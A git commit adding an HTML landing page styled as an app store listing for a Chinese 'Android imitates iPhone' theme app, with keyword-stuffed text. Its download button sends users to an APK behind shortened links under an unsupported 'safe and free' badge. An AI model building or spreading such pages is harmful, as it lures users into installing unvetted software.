bbb6ca4ff4dafb0b6a6552ccd8f0719014abc4bb
MicroeasyOT0 <Chengzheng1166@outlook.com>
2025-03-07 02:51:53 +0800

    Add files via upload

---
+++ ztku.cc
@@ -0,0 +1,134 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+    <title>主题库-安卓仿苹果-安卓仿iOS-安卓仿iphone全套软件-安卓仿苹果ios主题</title>
+	<meta name="keywords" content="主题库">
+	<meta name="description" content="安卓仿iPhone 安卓仿苹果软件OPPO仿苹果，安卓仿苹果控制中心，vivo仿苹果，华为仿苹果，小米仿苹果 华为仿苹果 安卓手机仿苹果键盘，安卓仿ios系统 安卓仿iphone全套软件仿苹果，安卓仿苹果备忘录下载，安卓仿苹果底部小横条">
+  <meta name="keywords" content>
+  <meta name="description" content>
+  <link rel="stylesheet" type="text/css" href="css/appstore.css">
+  <style>html,body{font-size:12px;}</style>
+ <!-- <script type="text/javascript">
+      !function (a, b) { function c() { var b = f.getBoundingClientRect().width; b / i > 800 && (b = 800 * i); var c = b / 20; f.style.fontSize = c + "px", k.rem = a.rem = c } var d, e = a.document, f = e.documentElement, g = e.querySelector('meta[name="viewport"]'), h = e.querySelector('meta[name="flexible"]'), i = 0, j = 0, k = b.flexible || (b.flexible = {}); if (g) {  var l = g.getAttribute("content").match(/initial\-scale=([\d\.]+)/); l && (j = parseFloat(l[1]), i = parseInt(1 / j)) } else if (h) { var m = h.getAttribute("content"); if (m) { var n = m.match(/initial\-dpr=([\d\.]+)/), o = m.match(/maximum\-dpr=([\d\.]+)/); n && (i = parseFloat(n[1]), j = parseFloat((1 / i).toFixed(2))), o && (i = parseFloat(o[1]), j = parseFloat((1 / i).toFixed(2))) } } if (!i && !j) { var p = (a.navigator.appVersion.match(/android/gi), a.navigator.appVersion.match(/iphone/gi)), q = a.devicePixelRatio; i = p ? q >= 3 && (!i || i >= 3) ? 3 : q >= 2 && (!i || i >= 2) ? 2 : 1 : 1, j = 1 / i } if (f.setAttribute("data-dpr", i), !g) if (g = e.createElement("meta"), g.setAttribute("name", "viewport"), g.setAttribute("content", "initial-scale=" + 1 + ", maximum-scale=" + 1 + ", minimum-scale=" + 1 + ", user-scalable=no"), f.firstElementChild) f.firstElementChild.appendChild(g); else { var r = e.createElement("div"); r.appendChild(g), e.write(r.innerHTML) } a.addEventListener("resize", function () { clearTimeout(d), d = setTimeout(c, 300) }, !1), a.addEventListener("pageshow", function (a) { a.persisted && (clearTimeout(d), d = setTimeout(c, 300)) }, !1), "complete" === e.readyState ? e.body.style.fontSize = 12 * i + "px" : e.addEventListener("DOMContentLoaded", function () { e.body.style.fontSize = 12 * i + "px" }, !1), c(), k.dpr = a.dpr = i, k.refreshRem = c, k.rem2px = function (a) { var b = parseFloat(a) * this.rem; return "string" == typeof a && a.match(/rem$/) && (b += "px"), b }, k.px2rem = function (a) { var b = parseFloat(a) / this.rem; return "string" == typeof a && a.match(/px$/) && (b += "rem"), b } }(window, window.lib || (window.lib = {}));
+  </script> -->
+</head>
+<body>
+  <div class="appstore_main">
+    <div class="a_top">
+      <div class="logo"><img src="http://bbs1.people.com.cn/img_new/Y0/B5/B0/3E/FD/1643725733629.jpeg"></div>
+      <div class="name">
+        <div class="title">
+          <span class="app_name">主题库</span>
+          <span class="icon"></span>
+        </div>
+        <div class="star"><img src="https://p6-tt-ipv6.byteimg.com/origin/pgc-image/008654d64148436cbd360523b9b001b3"></div>
+        <div class="security">
+          <img src="https://pic.imgdb.cn/item/603a229a5f4313ce2524355a.png">
+          <div class="status">
+            <span>安全免费功能多</span>
+            
+           
+          </div>
+        </div>
+      </div>
+      <div class="down">
+        <button onclick="downApk()" class="app_down_btn">立即下载</button>
+        <div class="download_count"> </div>
+      </div>
+    </div>
+    <div class="a_cent">
+      <div class="img-list">
+        <img class="full" src="http://bbs1.people.com.cn/img_new/Y0/2B/C1/5B/F4/1675771337716.jpeg">
+  <img class="full" src="http://bbs1.people.com.cn/img_new/Y0/2B/C1/9F/93/1675771355027.jpeg">
+        <img class="full" src="http://bbs1.people.com.cn/img_new/Y0/2B/C1/CF/82/1675771367298.jpeg">
+        <img class="full" src="https://sourl.cn/EvgYSi">
+        <img class="full" src="https://sourl.cn/DyhdYP">
+        <img class="full" src="https://sourl.cn/iKgFBY">
+        <img class="full" src="https://sourl.cn/ArMMXP">
+        <img class="full" src="https://sourl.cn/usQsy3">
+        <img class="full" src="https://sourl.cn/y8k8tw">
+    <img class="full" src="https://sourl.cn/LdPgjg">
+        <img class="full" src>
+      </div>
+ </div>
+     </div>
+      </div>
+</div>
+    </div>
+    <div class="a_desc">
+
+      <h2><i></i>应用介绍</h2>
+      <p class="blue"><p>【强烈推荐】功能多｜永久使用｜安卓仿苹果</p >
+<p>【机型超多】支持超多手机主题导入的教程哦</p >
+<p>【教程详细】一步一步教你非常细节绝对学会</p >
+<p>【仿刘海屏】安卓用户可直接应用苹果刘海屏</p >
+<p>【控制中心】高仿苹果下拉的控制中心可调节</p >
+<p>【桌面效果】所有手机都可以用直接苹果系统</p >
+<p>【仿音量键】高仿苹果音量键可以自定义调节</p >
+<p>【仿小组件】超多苹果小组件供你选择使用哦</p >
+<p>【专属客服】有问题可以直接联系软件内客服</p >
+<p>安卓仿iPhone  安卓仿苹果软件 OPPO仿苹果</p >
+<p>安卓仿苹果控制中心  vivo仿苹果  华为仿苹果</p >
+<p>小米仿苹果 华为仿苹果  安卓手机仿苹果键盘！</p >
+<p>安卓仿ios系统安卓仿iphone全套软件仿苹果</p >
+<p>安卓仿苹果备忘录下载 安卓仿苹果底部小横条</p > 
+    </div>
+  </div>
+  <div style="display:none;">
+  
+  </div>
+  <script type="text/javascript">
+    	var isApi = false;
+    	var granted = false;
+    	var apk_url = 'https://sourl.cn/zvhecf';
+    	
+	    apiready = function(){
+	    	isApi = true;
+	    	/* var resultList = api.hasPermission({
+	    	    list:['storage']
+	    	});
+	    	granted = resultList[0].granted;
+	    	if( !granted ){
+	    		api.requestPermission({
+		    	    list:['storage'],
+		    	    code:1
+		    	}, function(ret, err){
+		    	    
+		    	});
+	    	} */
+	    }
+	    var ua = window.navigator.userAgent.toLowerCase();
+	    var isWeixin = ua.match(/MicroMessenger/i) == 'micromessenger';
+	    function downApk(e){
+	    	var url = 'https://url.cn/URcu6YtI';
+	        if(isApi){
+	        	if( api.systemType == 'ios'){
+	        		alert("该应用仅支持Android");
+	        		return;
+	        	}
+	        	var installed = api.appInstalled({
+				    sync: true,
+				    appBundle: 'com.quanminzan.app'
+				});
+	        	
+	        	if( installed )  {
+	        		api.openApp({
+	        		    androidPkg: 'com.quanminzan.app',
+	        		    mimeType: 'text/html',
+	        		    uri: ''
+	        		}, function(ret, err) {
+	        		    
+	        		});
+	        		return;
+	        	}
+	        }else{
+	            location.href = apk_url;
+	        }
+	    }
+	</script>
+</html>
+	</body>
